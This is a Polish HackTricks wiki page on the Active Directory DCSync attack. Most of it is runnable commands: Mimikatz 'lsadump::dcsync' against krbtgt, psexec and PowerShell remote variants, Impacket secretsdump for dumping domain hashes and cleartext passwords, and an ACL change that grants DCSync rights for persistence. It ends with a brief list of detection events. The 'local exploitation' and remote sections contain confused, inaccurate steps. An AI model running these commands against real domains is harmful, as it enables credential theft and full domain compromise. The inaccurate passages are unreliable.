# DCSync

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Użyj [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks), aby łatwo tworzyć i **automatyzować zadania** przy użyciu najbardziej zaawansowanych narzędzi społeczności.\
Otrzymaj dostęp już dziś:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel się swoimi trikami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## DCSync

Uprawnienie **DCSync** oznacza posiadanie tych uprawnień w stosunku do samej domeny: **DS-Replication-Get-Changes**, **Replicating Directory Changes All** i **Replicating Directory Changes In Filtered Set**.

**Ważne uwagi dotyczące DCSync:**

* Atak **DCSync symuluje zachowanie kontrolera domeny i prosi inne kontrolery domeny o replikację informacji** przy użyciu zdalnego protokołu replikacji katalogu usługi (MS-DRSR). Ponieważ MS-DRSR jest ważną i niezbędną funkcją Active Directory, nie można go wyłączyć ani wyłączyć.
* Domyślnie tylko grupy **Domain Admins, Enterprise Admins, Administrators i Domain Controllers** mają wymagane uprawnienia.
* Jeśli jakiekolwiek hasła konta są przechowywane z odwracalnym szyfrowaniem, w Mimikatz dostępna jest opcja zwrócenia hasła w postaci tekstu jawnego.

### Wyliczanie

Sprawdź, kto ma te uprawnienia, używając `powerview`:
```powershell
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ActiveDirectoryRights -match 'WriteDacl')}
```
### Wykorzystanie lokalne

W przypadku wykorzystania lokalnego atakujący musi mieć dostęp do systemu docelowego. Poniżej przedstawiono kroki, które należy podjąć, aby wykorzystać tę metodę:

1. Zaloguj się na system docelowy jako użytkownik z uprawnieniami administratora.
2. Uruchom wiersz polecenia jako administrator.
3. Wykonaj polecenie `mimikatz sekurlsa::logonpasswords`, aby wyeksportować hasła z pamięci systemu.
4. Przeglądaj wyeksportowane hasła w celu znalezienia informacji uwierzytelniających konta administratora domeny.
5. Wykorzystaj znalezione dane uwierzytelniające do uzyskania dostępu do kontrolera domeny.

Pamiętaj, że wykorzystanie lokalne wymaga fizycznego dostępu do systemu docelowego i uprawnień administratora.
```powershell
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
```
### Wykorzystanie zdalne

DCSync może być wykorzystane zdalnie, jeśli atakujący ma uprawnienia do zdalnego wykonywania poleceń na komputerze docelowym. Aby to zrobić, atakujący może użyć narzędzia takiego jak PowerShell lub polecenie `psexec` w celu zdalnego uruchomienia polecenia `mimikatz` na komputerze docelowym. Następnie atakujący może użyć polecenia `lsadump::dcsync` w narzędziu `mimikatz` w celu wykradzenia danych z kontrolera domeny. 

Przykład wykorzystania zdalnego za pomocą PowerShell:

```powershell
Invoke-Command -ComputerName <nazwa_komputera> -ScriptBlock {
    Invoke-Expression -Command "mimikatz.exe lsadump::dcsync /domain:<nazwa_domeny> /user:<nazwa_użytkownika>"
}
```

Przykład wykorzystania zdalnego za pomocą polecenia `psexec`:

```bash
psexec \\nazwa_komputera -s -d cmd.exe /c "mimikatz.exe lsadump::dcsync /domain:<nazwa_domeny> /user:<nazwa_użytkownika>"
```

W obu przypadkach atakujący musi mieć uprawnienia do zdalnego wykonywania poleceń na komputerze docelowym.
```powershell
secretsdump.py -just-dc <user>:<password>@<ipaddress> -outputfile dcsync_hashes
[-just-dc-user <USERNAME>] #To get only of that user
[-pwd-last-set] #To see when each account's password was last changed
[-history] #To dump password history, may be helpful for offline password cracking
```
`-just-dc` generuje 3 pliki:

* jeden z **hashami NTLM**
* jeden z **kluczami Kerberos**
* jeden z hasłami w czystym tekście z NTDS dla kont, które mają włączone [**szyfrowanie odwracalne**](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption). Możesz uzyskać użytkowników z szyfrowaniem odwracalnym za pomocą polecenia

```powershell
Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol
```

### Trwałość

Jeśli jesteś administratorem domeny, możesz przyznać te uprawnienia dowolnemu użytkownikowi za pomocą `powerview`:
```powershell
Add-ObjectAcl -TargetDistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -PrincipalSamAccountName username -Rights DCSync -Verbose
```
Następnie możesz **sprawdzić, czy użytkownikowi zostały poprawnie przypisane** trzy uprawnienia, szukając ich w wyniku (powinieneś zobaczyć nazwy uprawnień w polu "ObjectType"):
```powershell
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{$_.IdentityReference -match "student114"}
```
### Zapobieganie

* Zdarzenie zabezpieczeń ID 4662 (Włączona musi być polityka audytu dla obiektu) - Wykonano operację na obiekcie
* Zdarzenie zabezpieczeń ID 5136 (Włączona musi być polityka audytu dla obiektu) - Zmodyfikowano obiekt usługi katalogowej
* Zdarzenie zabezpieczeń ID 4670 (Włączona musi być polityka audytu dla obiektu) - Zmieniono uprawnienia obiektu
* AD ACL Scanner - Tworzy i porównuje raporty ACL. [https://github.com/canix1/ADACLScanner](https://github.com/canix1/ADACLScanner)

## Odwołania

* [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync)
* [https://yojimbosecurity.ninja/dcsync/](https://yojimbosecurity.ninja/dcsync/)

<details>

<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć **reklamę swojej firmy w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Użyj [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks), aby łatwo tworzyć i **automatyzować zadania** przy użyciu najbardziej zaawansowanych narzędzi społecznościowych na świecie.\
Otrzymaj dostęp już dziś:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
